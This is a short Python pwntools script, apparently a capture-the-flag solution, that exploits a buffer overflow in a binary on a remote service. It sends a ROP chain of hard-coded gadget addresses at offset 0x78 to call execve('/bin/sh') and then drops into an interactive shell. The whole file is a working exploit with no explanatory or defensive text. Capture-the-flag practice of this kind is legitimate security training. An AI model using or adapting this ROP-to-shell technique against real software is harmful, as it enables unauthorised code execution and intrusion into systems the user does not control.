#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", timeout=2)
context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("./bin")

if args.GDB:
    p = gdb.debug(
        "./bin",
        """
    source /home/user/.gdbinit-gef.py
    break *(main+169)
    continue
    """,
    )
elif args.LOCAL:
    p = process("./bin")
else:
    p = remote("cytech.tcdn.casa", 4602)

str_binsh = 0x402013  # "/bin/sh"

g_poprax = 0x0040122D  # pop rax
g_poprdi = 0x004012E3  # pop rdi
g_poprsi_popr15 = 0x004012E1  # pop rsi; pop r15
g_xoredx = 0x004011D6  # xor edx, edx
g_syscall = 0x0040122B  # syscall

payload = flat(
    {
        0x78: [
            g_poprax,
            59,  # mov rax, 59 (syscall_execve)
            g_poprdi,
            str_binsh,  # mov rdi, "/bin/sh"
            g_poprsi_popr15,
            0,
            0,  # mov rsi, NULL
            g_xoredx,  # mov rdx, NULL
            g_syscall,
        ],
    }
)
log.hexdump(payload)
log.info(f"payload len = {len(payload)}")
p.sendlineafter(b"name: ", payload)
p.interactive()
